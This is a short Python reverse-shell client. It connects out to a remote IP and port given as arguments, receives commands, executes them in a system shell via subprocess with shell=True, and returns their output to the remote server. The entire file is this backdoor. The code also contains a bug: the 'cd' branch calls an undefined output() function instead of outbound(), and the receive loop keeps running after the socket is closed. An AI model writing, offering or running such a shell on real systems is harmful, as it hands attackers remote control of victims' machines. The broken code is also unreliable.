import socket
import subprocess
import os
import sys


def session_handler():
    print(f'[+] Connecting to {host_ip}')
    sock.connect((host_ip, host_port))
    print(f'[+] Connected to {host_ip}')

    while True:
        message = inbound()
        print(f'[+] Message received - {message}')

        if message == 'exit':
            print('[-] The server has terminated the session')
            sock.close()
            break
        elif message.split(" ")[0] == 'cd':
            directory = str(message.split(" ")[1])
            os.chdir(directory)
            cur_dir = os.getcwd()
            print(f'[+] Changed current directory to {cur_dir}')
            output(cur_dir)
        else:
            # subprocess command handling
            command = subprocess.Popen(message,
                                    shell = True,
                                    stdout = subprocess.PIPE,
                                    stderr = subprocess.PIPE)
            output = command.stdout.read() + command.stderr.read()
            outbound(output.decode())



def inbound():
    """
    This function captures incoming traffic and redirects it
    back to session_handler
    """
    print('[+] Awaiting response...')
    message = ''

    while True:
        try:
            message = sock.recv(1024).decode()
            return message
        except Exception:
            sock.close()

def outbound(message):
    """
    This function handles all outbound traffic back to the sockserver.
    """
    response = str(message).encode()
    sock.send(response)




# generate the socket handler for our code
if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host_ip = sys.argv[1]
    host_port = int(sys.argv[2])
    session_handler()
